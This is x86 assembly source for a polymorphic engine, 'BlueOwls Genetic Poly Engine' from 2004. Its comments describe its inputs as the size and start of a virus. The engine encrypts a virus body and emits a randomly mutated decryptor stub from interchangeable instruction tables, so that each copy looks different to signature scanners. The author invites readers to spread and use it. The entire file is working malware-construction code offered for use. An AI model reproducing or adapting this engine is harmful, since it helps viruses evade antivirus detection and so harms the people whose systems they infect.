; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤


        ; BGPE  - BlueOwls Genetic Poly Engine (Simple version)

        ; Al though this is just a "simple" version, feel free to spread and
        ; use it in whatever you like, as long as you don't hold me responsible
        ; AND don't claim it is yours. :) What i was thinking about adding was
        ; placing all the code blocks in random order, maybe something for a
        ; next version ;).

        ; Good luck with it.
        ; BlueOwl

        ; BTW. Sorry for not commenting this much, but personally

                ; in:   eax = rnd
                ;       ecx = size of virus in bytes rounded to a dword ((virus_size+3)/4)*4
                ;       esi = start of virus
                ;       edi = start of outputbuffer
                ;
                ; out:  eax = size of generated


                ptr_low         equ 0      shl 3 + 6
                ptr_high        equ 1      shl 3 + 6
                ctr_low         equ 2      shl 3 + 6
                ctr_high        equ 3      shl 3 + 6
                tmp_low         equ 4      shl 3 + 6
                ptrtmp          equ 5      shl 3 + 6
                ptrptr          equ 6      shl 3 + 6
                ctrctr          equ 7      shl 3 + 6
                cjmp            equ 8      shl 3 + 6
                mlbl            equ 9      shl 3 + 6
                edword          equ 10     shl 3 + 6
                ebyte           equ 11     shl 3 + 6
                size_dword      equ 12     shl 3 + 6
                tmptmp          equ 13     shl 3 + 6
                ecd             equ 14     shl 3 + 6

                estart          equ ebp-4*1
                rna             equ ebp-4*2
                vsized          equ ebp-4*3
                lbler           equ ebp-4*4
                _edword         equ ebp+7*4
                _ebyte          equ ebp-4*5


BGPE:           pushad
                call    inner_delta
inner_delta:    pop     ebp
                push    dword [ebp+bgpe_dna-inner_delta]        ; save old dna
                push    dword [ebp+lregsstart-inner_delta]      ; save old registeruse
                push    dword [ebp+lregsstart+4-inner_delta]    ;  "        "
                push    ebp

                push    ecx
                lea     ecx, [ebp+lregsstart-inner_delta]
                lea     ebx, [ebp+bgpe_dna-inner_delta]
                mov     ebp, esp
                add     ebp, 4
                call    bgpe_rand
                xchg    edx, eax
                call    bgpe_rand
                and     edx, eax
                call    bgpe_rand
                and     edx, eax
                call    bgpe_rand
                and     edx, eax                                ; chance 1 in 16 for each bit

                xor     [ebx], edx

                push    7
                pop     edx
                xchg    ecx, edx
mutate_regs:    call    bgpe_rand
                test    eax, 0111b                              ; chance of 3 bits being 0 in 8
                jnz     no_mut
                mov     al, byte [edx]                          ; swap around register
                mov     byte [edx+1], al
no_mut:         inc     edx
                loop    mutate_regs
                pop     ecx

                mov     al, 0e8h
                stosb
                mov     eax, ecx
                stosd
                push    edi
                shr     ecx, 2
                db      068h
bgpe_dna        dd      0       ; 01010101010101010101010101010101b
                push    ecx
                push    eax
                rep     movsd
                call    bgpe_rand
                push    eax

                call    load_table

getptr:         gp1     db gp2-gp1,ptr_low,58h,ptr_low,50h              ; pop reg / push reg
                gp2     db gp3-gp2,08bh,ptr_high,04h,024h               ; mov reg, [esp]
                gp3     db gp4-gp3,0ffh,034h,024h,ptr_low,058h          ; push [esp] / pop reg
                gp4     db gp5-gp4,00bh,ptr_high,04h,024h,023h,ptr_high,04h,024h ; or reg, [esp] / and reg, [esp]
                gp5:

initcnt:        ic1     db ic2-ic1,ctr_low,0b8h,size_dword              ; mov reg, value
                ic2     db ic3-ic2,068h,size_dword,ctr_low,058h         ; push value / pop reg
                ic3     db ic4-ic3,083h,ctr_low,0e0h,000h,081h,ctr_low,0c0h,size_dword ; and reg, 0 / add reg, value
                ic4     db ic5-ic4,08dh,ctr_high,005h,size_dword        ; lea reg, [value]
                ic5:

getdword:       gd1     db gd2-gd1,mlbl,087h,ptrtmp,0                        ; xchg reg, [reg]
                gd2     db gd3-gd2,mlbl,0ffh,ptr_low,030h,tmp_low,058h       ; push [reg] / pop reg
                gd3     db gd4-gd3,mlbl,08bh,ptrtmp,0                        ; mov reg, [reg]
                gd4     db gd5-gd4,mlbl,00bh,ptrtmp,000h,023h,ptrtmp,000h    ; or reg, [reg] / and reg, [reg]
                gd5:

decryptdword:   cy1     db cy2-cy1,08dh,tmptmp,080h,edword,0c1h,tmp_low,0c0h,ebyte,ecd ; lea reg, [reg+value] / rol reg, value
                        push      ecx
                        movzx     ecx, byte [_ebyte]
                        ror       eax, cl
                        pop       ecx
                        sub       eax, [_edword]
                        ret
                cy2     db cy3-cy2,0c1h,tmp_low,0c8h,ebyte,0f7h,tmp_low,0d8h,ecd ; ror reg, value / neg reg
                        neg       eax
                        push      ecx
                        movzx     ecx, byte [_ebyte]
                        rol       eax, cl
                        pop       ecx
                        ret
                cy3     db cy4-cy3,0fh,tmp_low,0c8h,081h,tmp_low,0f0h,edword,ecd ; bswap reg / xor reg, value
                        xor       eax, [_edword]
                        bswap     eax
                        ret
                cy4     db cy5-cy4,081h,tmp_low,0e8h,edword,0f7h,tmp_low,0d0h,ecd ; sub reg, value / not reg
                        not       eax
                        add       eax, [_edword]
                        ret
                cy5:

putdword:       pd1     db pd2-pd1,087h,ptrtmp,0                        ; xchg [reg], reg
                pd2     db pd3-pd2,tmp_low,050h,08fh,ptr_low,000h       ; push reg / pop [reg]
                pd3     db pd4-pd3,089h,ptrtmp,0                        ; mov [reg], reg
                pd4     db pd5-pd4,021h,ptrtmp,000h,009h,ptrtmp,000h    ; and [reg], reg / or [reg], reg
                pd5:

addptr:         ap1     db ap2-ap1,08dh,ptrptr,040h,004h                ; lea reg, [reg+4]
                ap2     db ap3-ap2,083h,ptr_low,0c0h,004h               ; add reg, 4
                ap3     db ap4-ap3,083h,ptr_low,0e8h,0fch               ; sub reg, -4
                ap4     db ap5-ap4,ptr_low,040h,ptr_low,040h,ptr_low,040h,ptr_low,040h ; 4* inc reg
                ap5:

decctr:         dc1     db dc2-dc1,ctr_low,048h                         ; dec reg
                dc2     db dc3-dc2,083h,ctr_low,0e8h,001h               ; sub reg, 1
                dc3     db dc4-dc3,083h,ctr_low,0c0h,0ffh               ; add reg, -1
                dc4     db dc5-dc4,08dh,ctrctr,040h,0ffh                ; lea reg, [reg-1]
                dc5:

conjmp:         cj1     db cj2-cj1,009h,ctrctr,0c0h,074h,002h,0ebh,cjmp ; or reg, reg / jz $+4 / jmp label
                cj2     db cj3-cj2,ctr_low,040h,ctr_low,048h,075h,cjmp  ; inc reg / dec reg / jnz label
                cj3     db cj4-cj3,083h,ctr_low,0f8h,001h,073h,cjmp     ; cmp reg, 1 / jnb label
                cj4     db cj5-cj4,ctr_low,048h,078h,003h,ctr_low,040h,079h,cjmp ; dec reg / js $+3 / inc reg / jns label
                cj5:

doret:          rt1     db rt2-rt1,0c3h                                 ; ret
                rt2     db rt3-rt2,0c2h,000h,000h                       ; ret 0
                rt3     db rt4-rt3,058h,0ffh,0e0h                       ; pop eax / jmp eax
                rt4     db rt5-rt4,0ffh,034h,024h,0c2h,004h,00h         ; push [esp] / ret 4
                rt5:
                db 0

load_table:     pop     edx

                call    load_regs
lregsstart      db      00h,01h,02h,03h,05h,06h,07h
load_regs:      pop     ebx

do_decryptor:   cmp     byte [edx], 0
                jz      decryptor_done
                mov     esi, edx
                push    4
                pop     ecx
_reloadnext:    movzx   eax, byte [edx]
                add     edx, eax
                loop    _reloadnext
                mov     ecx, [rna]
                shr     dword [rna], 2                          ; move up rna
                and     ecx, 011b                               ; put ecx in range 0-3
                or      ecx, ecx
                jz      this_found
_loadthis:      movzx   eax, byte [esi]
                add     esi, eax
                loop    _loadthis
this_found:     movzx   ecx, byte [esi]
                dec     ecx
                inc     esi
process_table:  lodsb
                push    eax
                and     eax, 07h
                cmp     eax, 06
                pop     eax
                jz      special_command
                or      al, ah
                stosb
                sub     ah, ah
resume_process: loop    process_table
                jmp     do_decryptor
special_command:movzx   eax, al                                 ; process special command
do_command:     shr     eax, 3                                  ; (make label/add register/etc.)
                push    edx
                call    getsptrs
sptrs:          db      do_ptr_low-sptrs,do_ptr_high-sptrs,do_ctr_low-sptrs,do_ctr_high-sptrs
                db      do_tmp_low-sptrs,do_ptrtmp-sptrs,do_ptrptr-sptrs,do_ctrctr-sptrs
                db      do_docjmp-sptrs,do_mlbl-sptrs,do_edword-sptrs,do_ebyte-sptrs
                db      do_size_dword-sptrs,do_tmptmp-sptrs,do_ecd-sptrs
getsptrs:       pop     edx
                mov     al, byte [edx+eax]                      ; select the appropiate handler
                add     edx, eax
                sub     eax, eax
                call    edx
                pop     edx
                jmp     resume_process                          ; from here on different handlers
do_ecd:         push    edx edi
                xchg    esi, edx
                mov     ecx, [vsized]
                mov     esi, [estart]
                mov     edi, esi
_encrypt:       lodsd
                call    edx
                stosd
                loop    _encrypt
                push    1
                pop     ecx
                pop     edi edx
                ret
do_ptr_high:    mov     ah, [ebx+0]                             ; fix registers
                shl     ah, 3                                   ;    ...
                ret
do_ctr_high:    mov     ah, [ebx+1]
                shl     ah, 3
                ret
do_tmptmp:      mov     ah, [ebx+2]
                shl     ah, 3
do_tmp_low:     or      ah, [ebx+2]
                ret
do_ptrtmp:      mov     ah, [ebx+2]
                shl     ah, 3
                jmp     do_ptr_low
do_ptrptr:      mov     ah, [ebx+0]
                shl     ah, 3
do_ptr_low:     or      ah, [ebx+0]
                ret
do_ctrctr:      call    do_ctr_high
do_ctr_low:     or      ah, [ebx+1]
                ret
do_docjmp:      mov     eax, [lbler]                            ; calculate jump difference
                sub     eax, edi
                dec     eax
                stosb
                ret
do_mlbl:        mov     [lbler], edi
                ret
do_edword:      mov     eax, [_edword]
                jmp     store_zero
do_size_dword:  mov     eax, [vsized]
store_zero:     stosd
                sub     eax, eax
                ret
do_ebyte:       mov     al, [_ebyte]
                stosb
                ret
decryptor_done: mov     esp, ebp

                pop     ebp
                pop     dword [ebp+lregsstart+4-inner_delta]    ;  restore old stuff
                pop     dword [ebp+lregsstart-inner_delta]      ;
                pop     dword [ebp+bgpe_dna-inner_delta]        ;

                mov     [esp+4*7], edi
                popad
                sub     eax, edi
                ret
bgpe_rand:      mov     eax, [ebp+7*4]
                rol     eax, 7
                neg     ax
                add     eax, 0B78F23A5h                         ; just a number
                xor     [ebp+7*4], eax                          ; save for later
                ret

; ¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤=÷=¤

; Copyright BlueOwl 2004

; Have a nice time. EOF.
